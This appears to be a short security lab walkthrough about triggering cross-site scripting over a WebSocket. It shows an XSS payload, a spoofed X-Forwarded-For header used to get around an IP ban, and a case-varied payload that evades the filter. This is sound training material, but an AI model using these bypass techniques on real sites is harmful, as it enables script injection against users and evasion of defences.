# Lab 02 — Manipulating the WebSocket Handshake

## Goal
Trigger XSS despite the flawed filter.

Basic payload:

```html
<img src=1 onerror='alert(1)'>
```

The connection is terminated and the IP is banned. Modify the handshake:

```http
X-Forwarded-For: 1.1.1.1
```

Reconnect, then use:

```html
<img src=1 oNeRrOr=alert`1`>
```
